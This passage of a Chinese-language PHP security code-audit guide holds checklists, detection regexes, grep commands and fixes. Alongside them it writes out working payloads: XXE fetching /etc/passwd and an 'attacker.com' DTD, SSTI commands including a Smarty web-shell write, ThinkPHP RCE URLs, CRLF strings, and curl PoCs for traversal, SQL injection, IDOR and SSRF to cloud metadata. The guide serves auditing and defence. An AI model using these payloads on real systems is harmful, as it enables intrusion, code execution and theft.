- [ ] 测试 token 重放

逻辑漏洞:
- [ ] 检查后台页面权限验证文件
- [ ] 检查用户资源所有权验证
- [ ] 检查权限等级验证
- [ ] 检查 Cookies 验证强度
- [ ] 检查安装程序逻辑 (exit缺失)
- [ ] 检查支付逻辑 (金额/签名验证)
- [ ] 检查重置密码逻辑
- [ ] 检查验证码逻辑

过滤逻辑:
- [ ] 检查过滤条件判断
- [ ] 检查过滤执行顺序
- [ ] 检查变量覆盖过滤结果
- [ ] 检查双写绕过 (str_replace)
- [ ] 检查大小写绕过
- [ ] 检查编码绕过

配置:
- [ ] 检查 disable_functions
- [ ] 检查 open_basedir
- [ ] 检查 display_errors (生产环境应关闭)
- [ ] 检查 expose_php
- [ ] 检查 allow_url_fopen
- [ ] 检查 allow_url_include
- [ ] 检查 register_globals (PHP < 5.4)
- [ ] 检查 magic_quotes_gpc (PHP < 5.4)

Laravel特定:
- [ ] 搜索 DB::raw / whereRaw
- [ ] 搜索 {!! !!}
- [ ] 检查 .env 配置
- [ ] 检查 APP_DEBUG (生产应为false)
- [ ] 检查 Mass Assignment ($guarded)

XXE (v1.7.1新增):
- [ ] 搜索 simplexml_load_string / simplexml_load_file
- [ ] 搜索 DOMDocument / XMLReader
- [ ] 搜索 SoapClient / SoapServer
- [ ] 检查 libxml_disable_entity_loader 配置
- [ ] 检查 LIBXML_NONET 标志

SSTI (v1.7.1新增):
- [ ] 搜索 Twig createTemplate / render_string
- [ ] 搜索 Smarty display("string:")
- [ ] 搜索 Blade {!! !!} / @php
- [ ] 检查模板变量来源

HTTP响应头注入 (v1.7.1新增):
- [ ] 搜索 header() + 变量拼接
- [ ] 搜索 setcookie() + 变量
- [ ] 检查 CRLF 过滤 (\r\n)

Open Redirect (v1.7.1新增):
- [ ] 搜索 header("Location: " + 变量)
- [ ] 搜索框架 redirect() 函数
- [ ] 检查重定向白名单

Session安全 (v1.7.1新增):
- [ ] 检查登录后 session_regenerate_id
- [ ] 检查 session.cookie_httponly
- [ ] 检查 session.cookie_secure
- [ ] 检查 session.use_only_cookies

密码学 (v1.7.1新增):
- [ ] 搜索 md5/sha1 用于密码
- [ ] 搜索硬编码密钥
- [ ] 检查 rand/mt_rand 用于安全场景
- [ ] 检查 password_hash 使用

ThinkPHP特定 (v1.7.1新增):
- [ ] 检查 ThinkPHP 版本 (5.x RCE)
- [ ] 搜索 think\App / think\Request
- [ ] 检查路由配置

WordPress特定 (v1.7.1新增):
- [ ] 搜索 $wpdb->query 无 prepare
- [ ] 搜索 echo $_GET/POST 无转义
- [ ] 检查 wp_ajax_ 权限验证
- [ ] 检查 nonce 验证

竞态条件 (v1.7.1新增):
- [ ] 检查 file_exists + include 模式
- [ ] 检查余额/库存检查非原子性
- [ ] 检查是否使用数据库事务
- [ ] 检查文件锁 (flock)

授权一致性 (v1.7.1新增):
- [ ] 对比 CRUD 方法的权限检查
- [ ] 检查敏感操作权限验证
- [ ] 运行授权一致性检测脚本

ZIP Slip (v2.1.1新增):
- [ ] 搜索 ZipArchive / extractTo / extractPackage
- [ ] 搜索 PharData / tar_extract
- [ ] 检查解压后是否有路径验证
- [ ] 检查是否过滤 .. 路径遍历字符

间接SSRF (v2.1.1新增):
- [ ] 搜索 sprintf + $this->base / $config->url
- [ ] 搜索 rtrim + createLink 动态URL构造
- [ ] 追踪 fixer::input 到 curl/file_get_contents 的数据流
- [ ] 检查配置对象中的URL是否有验证
```

---

## 审计正则

```regex
# 代码执行
eval\s*\(|assert\s*\(|create_function\s*\(
system\s*\(|exec\s*\(|shell_exec\s*\(|passthru\s*\(
popen\s*\(|proc_open\s*\(|pcntl_exec\s*\(
preg_replace\s*\(.*\/.*e
call_user_func|call_user_func_array|array_map|array_filter|usort

# 文件包含
(include|require)(_once)?\s*\(\s*\$
php://|data://|phar://|zip://|expect://
allow_url_include|allow_url_fopen

# 反序列化
unserialize\s*\(|phar://
__wakeup|__destruct|__toString|__call|__get|__set
file_exists\s*\(.*phar|is_file\s*\(.*phar

# SQL注入
mysqli_query|mysql_query|pg_query|mssql_query
\$pdo->query.*\$|\$wpdb->query.*\$
DB::raw|whereRaw|selectRaw|orderByRaw|havingRaw
base64_decode.*query|urldecode.*query
set\s+names\s+['\"]gbk['\"]
addslashes|mysql_real_escape_string

# 文件上传
move_uploaded_file|\$_FILES
\.php\d|\.phtml|\.phar|\.phps|\.inc
Content-Type.*image|GIF89a

# 文件操作
unlink\s*\(|rmdir\s*\(
file_get_contents\s*\(|readfile\s*\(|fopen\s*\(
file_put_contents\s*\(|fwrite\s*\(
copy\s*\(|rename\s*\(
realpath\s*\(|basename\s*\(
\.\./|\.\.\\

# 变量覆盖
extract\s*\(\s*\$_|parse_str\s*\(.*\$_
import_request_variables
foreach.*\$_.*\$\$

# 弱类型
==\s*['\"]0e|strcmp\s*\(.*\[
in_array\s*\(.*,.*\)\s*(?!,\s*true)
is_numeric|switch\s*\(

# XSS
echo\s+\$|print\s+\$|print_r\s*\(.*\$
\<\?=\s*\$|printf\s*\(.*\$
htmlspecialchars|htmlentities|strip_tags

# CSRF
\$_GET\[.*\].*delete|\$_GET\[.*\].*update
token|csrf|referer

# 逻辑漏洞
checklogin|isadmin|is_admin
\$_SESSION\[.*role.*\]|\$_SESSION\[.*admin.*\]
if\s*\(.*\)\s*{\s*header\s*\(.*Location
exit\s*\(|die\s*\(

# Laravel
\{!!.*!!\}
DB::raw|whereRaw|->raw\(
APP_DEBUG|APP_KEY
\$guarded\s*=\s*\[\s*\]

# 配置相关
disable_functions|open_basedir
display_errors|expose_php
magic_quotes_gpc|register_globals

# XXE (v1.7.1新增)
simplexml_load|DOMDocument|XMLReader|SoapClient|SoapServer
LIBXML_NOENT|LIBXML_DTDLOAD|libxml_disable_entity_loader

# SSTI (v1.7.1新增)
createTemplate|render_string|Twig_Environment
Smarty.*display.*string:|->fetch\(.*string:
\{!!\s*\$|@php.*\$

# HTTP响应头注入 (v1.7.1新增)
header\s*\(\s*[\"'].*\$|header\s*\(\s*\$
setcookie\s*\(\s*\$|setrawcookie

# Open Redirect (v1.7.1新增)
header.*Location.*\$|redirect\s*\(\s*\$
->redirect\s*\(\s*\$

# Session安全 (v1.7.1新增)
session_regenerate_id|session_start
session\.cookie_httponly|session\.cookie_secure

# 密码学 (v1.7.1新增)
md5\s*\(.*password|sha1\s*\(.*password
\$key\s*=\s*[\"'][^\"']+[\"']|SECRET_KEY\s*=
rand\s*\(|mt_rand\s*\(

# ThinkPHP (v1.7.1新增)
think\\\\App|think\\\\Request|think\\\\Db
invokefunction|call_user_func_array

# WordPress (v1.7.1新增)
\$wpdb->query|\$wpdb->get_results|\$wpdb->get_var
wp_ajax_|add_action|current_user_can|check_ajax_referer
esc_html|esc_attr|wp_nonce

# 竞态条件 (v1.7.1新增)
file_exists.*include|is_file.*require
balance\s*>=|stock\s*>=|quantity\s*>=
flock\s*\(|lockForUpdate

# SSRF (v1.7.1增强)
curl_exec|file_get_contents\s*\(.*http|fopen.*http
sprintf.*\$.*base|sprintf.*\$.*url|curl_setopt.*\$this->

# 授权一致性 (v1.7.1新增)
checkPriv|canEdit|canDelete|hasPermission|isAuthorized
function\s+(delete|update|edit|remove|download|export)

# ZIP Slip (v2.1.1新增)
ZipArchive|extractTo|extractPackage|PharData|tar_extract
unzip\s*\(|gzopen\s*\(

# 间接SSRF (v2.1.1新增)
sprintf.*\$this->.*base|sprintf.*\$config.*url|sprintf.*%s.*%s.*api
rtrim.*\$.*createLink|rtrim.*\$host.*helper
curl_setopt.*CURLOPT_URL.*\$this->|curl_setopt.*\$config
fixer::input.*url|fixer::input.*base|fixer::input.*endpoint
```

---

## 调试技巧

```php
// 输出变量
var_dump($var);
print_r($var);
debug_print_backtrace();  // 打印调用栈

// 查看已定义函数
get_defined_functions();

// 查看已加载扩展
get_loaded_extensions();

// 查看禁用函数
ini_get('disable_functions');
```

---

## XXE (XML外部实体注入)

### 危险函数

```php
// XML 解析器
simplexml_load_string($xml);       // XXE!
simplexml_load_file($file);        // XXE!
new SimpleXMLElement($xml);        // XXE!
DOMDocument::loadXML($xml);        // XXE!
XMLReader::xml($xml);              // XXE!

// SOAP
new SoapClient($wsdl);             // XXE!
new SoapServer($wsdl);             // XXE!
```

### 漏洞利用

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;</root>

<!-- Blind XXE (OOB) -->
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">
  %xxe;
]>
```

### 安全配置

```php
// 禁用外部实体 (PHP >= 8.0 默认禁用)
libxml_disable_entity_loader(true);  // PHP < 8.0

// DOM 安全配置
$dom = new DOMDocument();
$dom->loadXML($xml, LIBXML_NOENT | LIBXML_DTDLOAD);  // 危险!
$dom->loadXML($xml, LIBXML_NONET);  // 安全: 禁用网络访问
```

### 检测命令

```bash
grep -rn "simplexml_load\|DOMDocument\|XMLReader\|SoapClient" --include="*.php"
grep -rn "LIBXML_NOENT\|LIBXML_DTDLOAD\|libxml_disable_entity_loader" --include="*.php"
```

---

## SSTI (服务端模板注入)

### Twig 模板注入

```php
// 危险: 用户输入作为模板
$template = $twig->createTemplate($_GET['template']);  // SSTI!
echo $template->render();

// 危险: 字符串模板
$twig->render_string($userInput);  // SSTI!

// Payload
{{ _self.env.registerUndefinedFilterCallback("exec") }}
{{ _self.env.getFilter("id") }}

// Twig 3.x Payload
{{ ['id'] | filter('system') }}
{{ ['cat /etc/passwd'] | map('system') }}
```

### Smarty 模板注入

```php
// 危险: 用户输入作为模板
$smarty->display("string:" . $_GET['tpl']);  // SSTI!

// Payload
{php}system('id');{/php}
{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"<?php passthru($_GET['cmd']); ?>",self::clearConfig())}
```

### Blade 模板注入

```php
// Laravel Blade - 通常安全，但注意:
{!! $userInput !!}  // 不转义输出，可能XSS
@php echo $userInput; @endphp  // 危险
```

### 检测命令

```bash
grep -rn "createTemplate\|render_string\|Twig_Environment" --include="*.php"
grep -rn "Smarty.*display.*string:" --include="*.php"
grep -rn "{!!\s*\\\$\|@php" --include="*.blade.php"
```

---

## HTTP 响应头注入 (CRLF)

### 漏洞模式

```php
// 危险: Header 参数可控
header("Location: " . $_GET['url']);  // CRLF注入!
header("Set-Cookie: lang=" . $_GET['lang']);  // CRLF注入!

// 利用: 注入额外响应头
?url=http://example.com%0d%0aSet-Cookie:%20admin=1
?lang=en%0d%0a%0d%0a<script>alert(1)</script>
```

### 检测命令

```bash
grep -rn "header\s*(\s*[\"'].*\\\$\|header\s*(\s*\\\$" --include="*.php"
grep -rn "setcookie\s*(\s*\\\$\|setrawcookie" --include="*.php"
```

### 安全修复

```php
// PHP 5.1.2+ 自动过滤换行符
// 但仍建议手动验证
$url = str_replace(["\r", "\n"], '', $_GET['url']);
header("Location: " . filter_var($url, FILTER_SANITIZE_URL));
```

---

## Open Redirect (开放重定向)

### 漏洞模式

```php
// 危险: 重定向URL可控
header("Location: " . $_GET['next']);  // Open Redirect!
header("Location: " . $_POST['return_url']);

// 框架示例
return redirect($_GET['url']);  // Laravel
$this->redirect($_GET['url']);  // ThinkPHP
```

### 检测命令

```bash
grep -rn "header.*Location.*\\\$\|redirect\s*(\s*\\\$" --include="*.php"
grep -rn "->redirect\s*(\s*\\\$" --include="*.php"
```

### 安全修复

```php
// 白名单验证
$allowed = ['/', '/dashboard', '/profile'];
if (in_array($_GET['next'], $allowed, true)) {
    header("Location: " . $_GET['next']);
}

// 相对路径验证
$url = $_GET['next'];
if (strpos($url, '://') === false && $url[0] === '/') {
    header("Location: " . $url);
}
```

---

## Session 安全

### Session 固定攻击

```php
// 危险: 登录后未重新生成 Session ID
if ($login_success) {
    $_SESSION['user'] = $username;
    // 缺少: session_regenerate_id(true);
}

// 安全: 登录后重新生成
if ($login_success) {
    session_regenerate_id(true);  // 删除旧session
    $_SESSION['user'] = $username;
}
```

### Session 配置检查

```php
// 检查项
session.cookie_httponly = 1    // 防止XSS窃取
session.cookie_secure = 1      // 仅HTTPS传输
session.use_only_cookies = 1   // 禁用URL传递session
session.use_strict_mode = 1    // 严格模式
```

### 检测命令

```bash
# 检查是否有 session_regenerate_id
grep -rn "session_start\|login\|authenticate" --include="*.php" | xargs -I {} grep -L "session_regenerate_id" {}

# 检查 session 配置
grep -rn "session\.cookie_httponly\|session\.cookie_secure" --include="*.php" --include="*.ini"
```

---

## 密码学安全

### 弱加密检测

```php
// 危险: 弱哈希算法
md5($password);          // 弱!
sha1($password);         // 弱!
crc32($password);        // 弱!

// 危险: 可逆编码当加密
base64_encode($password);  // 不是加密!

// 危险: 硬编码密钥
$key = "secret123";
$encrypted = openssl_encrypt($data, 'AES-256-CBC', $key);
```

### 安全实践

```php
// 密码哈希 (推荐)
password_hash($password, PASSWORD_DEFAULT);
password_verify($password, $hash);

// 加密 (推荐)
$key = sodium_crypto_secretbox_keygen();  // 随机密钥
$nonce = random_bytes(SODIUM_CRYPTO_SECRETBOX_NONCEBYTES);
$encrypted = sodium_crypto_secretbox($data, $nonce, $key);
```

### 检测命令

```bash
# 弱哈希
grep -rn "md5\s*(\|sha1\s*(" --include="*.php" | grep -i "password\|passwd\|pwd"

# 硬编码密钥
grep -rn "\\\$key\s*=\s*[\"'][^\"']+[\"']\s*;\|SECRET_KEY\s*=\s*[\"']" --include="*.php"

# 不安全随机数
grep -rn "rand\s*(\|mt_rand\s*(" --include="*.php" | grep -i "token\|key\|secret"
```

---

## ThinkPHP 特定漏洞

### ThinkPHP 5.x RCE

```php
// CVE-2018-20062 路由RCE
// URL: /index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=whoami

// CVE-2019-9082 核心类RCE
// URL: /index.php?s=index/\think\Request/input&filter=system&data=id

// 检测: 是否使用了漏洞版本
grep -rn "think\\\\App\|think\\\\Request" --include="*.php"
```

### ThinkPHP 6.x 安全

```php
// 反序列化检测
grep -rn "unserialize\|Phar::" --include="*.php"

// Session 反序列化
// 检查 session driver 配置
```

---

## WordPress 特定漏洞

### 常见漏洞模式

```php
// SQL 注入 (wpdb)
$wpdb->query("SELECT * FROM users WHERE id = " . $_GET['id']);  // SQLi!
// 安全: $wpdb->prepare()

// XSS (未转义输出)
echo $_GET['search'];  // XSS!
// 安全: esc_html(), esc_attr()

// 权限检查缺失
function ajax_delete_post() {
    // 缺少: check_ajax_referer() 和 current_user_can()
    wp_delete_post($_POST['id']);
}
add_action('wp_ajax_delete_post', 'ajax_delete_post');
```

### 检测命令

```bash
# SQL 注入
grep -rn "\\\$wpdb->query\|->get_results\|->get_var" --include="*.php" | grep -v "prepare"

# XSS
grep -rn "echo\s*\\\$_\|print\s*\\\$_" --include="*.php"

# 权限检查
grep -rn "wp_ajax_" --include="*.php" | xargs -I {} grep -L "current_user_can\|check_ajax_referer" {}
```

---

## 竞态条件 (Race Condition)

### TOCTOU (Time-of-Check to Time-of-Use)

```php
// 危险: 检查和使用之间有时间差
if (file_exists($file)) {       // 检查
    // 攻击者可能在此时替换文件
    include($file);              // 使用
}

// 危险: 余额检查和扣款非原子
if ($user->balance >= $amount) {  // 检查
    // 并发请求可能在此时通过检查
    $user->balance -= $amount;    // 扣款
    $user->save();
}
```

### 检测方法

```bash
# 文件操作 TOCTOU
grep -rn "file_exists.*if\|is_file.*if" --include="*.php" -A 5 | grep "include\|require\|unlink\|rename"

# 余额/库存检查
grep -rn "balance\s*>=\|stock\s*>=\|quantity\s*>=" --include="*.php"
```

### 安全修复

```php
// 使用数据库事务 + 悲观锁
DB::transaction(function () use ($amount) {
    $user = User::where('id', $userId)->lockForUpdate()->first();
    if ($user->balance >= $amount) {
        $user->balance -= $amount;
        $user->save();
    }
});

// 文件操作使用 flock
$fp = fopen($file, 'r+');
if (flock($fp, LOCK_EX)) {
    // 安全操作
    flock($fp, LOCK_UN);
}
fclose($fp);
```

---

## 授权检查缺失审计 (Authorization Gap)

> **漏检案例**: CVE-2025-13787 (ZenTao) - delete方法缺失权限检查

### 问题本质

```
⚠️ 授权漏洞是"代码缺失"而非"危险代码"
⚠️ grep无法直接检测"应该有但没有"的代码
⚠️ 必须使用对比分析法
```

### 检测方法

```bash
# 步骤1: 找到所有控制器的敏感操作
grep -rn "function\s\+\(delete\|remove\|update\|edit\|download\|export\)" --include="*control*.php"

# 步骤2: 对比同模块不同方法的权限检查
# 示例: file模块
grep -A 30 "function delete" module/file/control.php | grep -c "checkPriv\|canDelete\|access"
grep -A 30 "function download" module/file/control.php | grep -c "checkPriv\|access"

# 步骤3: 如果delete没有权限检查但download有，则存在漏洞
```

### 漏洞模式

```php
// ❌ 漏洞: delete方法缺失权限检查
public function delete($fileID)
{
    $file = $this->file->getById($fileID);  // 只通过ID获取
    $this->dao->delete()->from(TABLE_FILE)->where('id')->eq($fileID)->exec();  // 直接删除!
    // 任何用户都可以删除任意文件
}

// ✅ 安全: download方法有权限检查
public function download($fileID)
{
    $file = $this->file->getById($fileID);
    if(!$this->file->checkPriv($file)) {  // 权限验证
        return $this->send(array('message' => 'Access denied'));
    }
    // ... 下载逻辑
}
```

### 自动化检测脚本

```bash
#!/bin/bash
# check_auth_consistency.sh

SENSITIVE_OPS="delete|remove|destroy|update|edit|modify|download|export|execute"
AUTH_CHECK="checkPriv|canEdit|canDelete|hasPermission|isAuthorized|access.*denied|authorize"

for ctrl in $(find . -name "*control*.php" 2>/dev/null); do
    echo "=== $ctrl ==="

    # 提取所有敏感方法
    methods=$(grep -oP "function\s+\K($SENSITIVE_OPS)\w*" "$ctrl" 2>/dev/null | sort -u)

    for m in $methods; do
        auth=$(grep -A 40 "function\s*$m" "$ctrl" 2>/dev/null | grep -cE "$AUTH_CHECK")
        if [ "$auth" -eq 0 ]; then
            echo "  [VULN] $m() - NO AUTH CHECK"
            grep -n "function.*$m" "$ctrl"
        fi
    done
done
```

---

## SSRF 审计 (增强版)

> **漏检案例**: CVE-2025-13789 (ZenTao) - AI模块base URL参数导致SSRF

### 直接 SSRF

```php
// 危险: 用户输入直接用于URL
$url = $_GET['url'];
$data = file_get_contents($url);  // SSRF!

$ch = curl_init($_POST['target']);  // SSRF!
curl_exec($ch);
```

### 间接 SSRF (配置驱动) - 常被遗漏!

```php
// 漏洞模式: 用户输入 → 配置对象 → HTTP请求
// 步骤1: 用户提交配置
$modelConfig = fixer::input('post')->get();  // 包含 base 字段

// 步骤2: 配置存储到对象
$this->ai->setModelConfig($modelConfig);

// 步骤3: 配置用于URL构造 (核心漏洞点!)
$url = sprintf('%s/%s', rtrim($this->modelConfig->base, '/'), $apiPath);

// 步骤4: 发起HTTP请求
curl_setopt($ch, CURLOPT_URL, $url);
curl_exec($ch);  // SSRF!

// 攻击: base=http://169.254.169.254/latest/meta-data/
```

### 检测命令

```bash
# 直接SSRF
grep -rn "curl_exec\|file_get_contents\|fopen.*http\|fsockopen" --include="*.php"

# 间接SSRF (配置驱动)
grep -rn "sprintf.*\\\$.*base\|sprintf.*\\\$.*url\|sprintf.*%s.*%s" --include="*.php"
grep -rn "curl_setopt.*\\\$this->\|curl_setopt.*\\\$config" --include="*.php"

# 检查用户输入到配置的流向
grep -rn "fixer::input\|input('post')" --include="*.php" | grep -i "url\|base\|endpoint\|host"
```

### SSRF 验证清单

| 检查项 | 命令/方法 |
|--------|----------|
| 协议限制 | 搜索 `http://\|https://` 白名单 |
| 内网IP过滤 | 搜索 `10.\|172.\|192.168\|127.` 黑名单 |
| 云Metadata过滤 | 搜索 `169.254.169.254` 黑名单 |
| DNS Rebinding防护 | 搜索 IP解析后的二次验证 |
| 重定向限制 | 搜索 `CURLOPT_FOLLOWLOCATION` 设置 |

---

---

## ZIP Slip (路径遍历) (v2.1.1新增)

### 漏洞模式

```php
// 危险: 解压后直接使用文件名，无路径验证
$zip = new ZipArchive();
$zip->open($_FILES['file']['tmp_name']);
$zip->extractTo($dest);  // ZIP Slip!

// 漏洞利用: 压缩包内含 ../../etc/cron.d/evil 或 ../../../config.php
// 解压后可覆盖任意文件

// 常见危险模式
$this->extensionZen->extractPackage($extension);  // 无路径检查
PharData::extractTo($dest);  // Phar同样存在风险
```

### 安全修复

```php
// 验证解压后的每个文件路径
$zip = new ZipArchive();
$zip->open($archivePath);
$basePath = realpath($dest);

for ($i = 0; $i < $zip->numFiles; $i++) {
    $filename = $zip->getNameIndex($i);

    // 检查路径遍历字符
    if (strpos($filename, '..') !== false) {
        throw new Exception('Invalid path in archive');
    }

    // 验证解压目标在允许目录内
    $targetPath = realpath($dest . '/' . dirname($filename));
    if ($targetPath === false || strpos($targetPath, $basePath) !== 0) {
        throw new Exception('Path traversal detected');
    }
}
$zip->extractTo($dest);
```

### 检测命令

```bash
# 查找ZIP解压操作
grep -rn "ZipArchive\|extractTo\|extractPackage\|PharData\|tar_extract" --include="*.php"

# 检查解压后是否有路径验证 (负向检测)
grep -rn "extractTo" --include="*.php" -A 15 | grep -c "realpath\|strpos.*\.\.\|basename"
```

---

## 间接SSRF (配置驱动) (v2.1.1新增)

### 漏洞模式

```php
// 与直接SSRF不同，间接SSRF通过配置对象间接传递用户输入

// 步骤1: 用户输入存入配置对象
$modelConfig = fixer::input('post')->get();  // 包含 base=http://evil.com

// 步骤2: 配置对象存储
$this->ai->setModelConfig($modelConfig);

// 步骤3: 配置用于URL构造 (核心漏洞点)
$url = sprintf('%s/%s', rtrim($this->modelConfig->base, '/'), $apiPath);
// 或
$url = rtrim($host, '/') . helper::createLink($moduleName, $methodName);

// 步骤4: 发起HTTP请求
curl_setopt($ch, CURLOPT_URL, $url);
curl_exec($ch);  // SSRF!

// 攻击示例: base=http://169.254.169.254/latest/meta-data/
```

### 检测命令

```bash
# 配置驱动URL构造
grep -rn "sprintf.*\$this->.*base\|sprintf.*\$config.*url" --include="*.php"
grep -rn "rtrim.*\$.*createLink\|rtrim.*\$host" --include="*.php"

# curl使用配置对象
grep -rn "curl_setopt.*CURLOPT_URL.*\$this->" --include="*.php"
grep -rn "file_get_contents.*\$this->.*url\|file_get_contents.*\$config" --include="*.php"

# 追踪用户输入到配置
grep -rn "fixer::input\|input('post')" --include="*.php" | grep -i "url\|base\|endpoint\|host"
```

### 安全修复

```php
// 验证配置中的URL
function validateBaseUrl($url) {
    $parsed = parse_url($url);

    // 协议白名单
    if (!in_array($parsed['scheme'], ['http', 'https'])) {
        return false;
    }

    // 内网IP黑名单
    $ip = gethostbyname($parsed['host']);
    if (filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE) === false) {
        return false;  // 内网IP
    }

    // 云Metadata黑名单
    if (strpos($ip, '169.254.') === 0) {
        return false;
    }

    return true;
}
```

---

## 最小 PoC 示例
```bash
# 文件包含
curl "http://localhost/index.php?page=../../../../etc/passwd"

# 反序列化
php -r '$payload = "O:4:\"Evil\":0:{}"; echo urlencode($payload);'

# SQL 注入
curl "http://localhost/search.php?q=1' OR '1'='1"

# 授权绕过 (IDOR)
curl "http://localhost/file-delete-999-yes.html" -H "Cookie: session=user_cookie"

# SSRF (配置驱动)
curl -X POST "http://localhost/ai-modelTestConnection.html" \
  -d "base=http://169.254.169.254/latest/meta-data/&key=xxx&type=openai&vendor=openaiCompatible"
```
